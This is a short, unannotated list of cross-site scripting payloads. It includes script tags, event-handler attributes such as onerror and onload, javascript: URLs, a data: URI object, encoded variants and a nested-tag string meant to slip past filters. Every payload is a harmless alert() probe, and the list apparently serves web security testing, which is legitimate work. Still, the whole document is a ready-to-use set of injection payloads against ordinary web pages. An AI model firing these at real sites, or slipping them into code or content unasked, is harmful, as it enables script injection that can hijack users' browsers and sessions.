<script>alert('XSS')</script>

<img src="x" onerror="alert('XSS')">

<svg onload="alert('XSS')">

<body onload="alert('XSS')">

<iframe src="javascript:alert('XSS')"></iframe>

<a href="javascript:alert('XSS')">Click me</a>

<div style="background:url(javascript:alert('XSS'))">

<input type="text" value="' onfocus='alert(1)">

<marquee onstart="alert('XSS')">

<object data="data:text/html,<script>alert('XSS')</script>">

&lt;script&gt;alert('XSS')&lt;/script&gt;

%3Cscript%3Ealert('XSS')%3C/script%3E

<scr<script>ipt>alert('XSS')</scr</script>ipt>
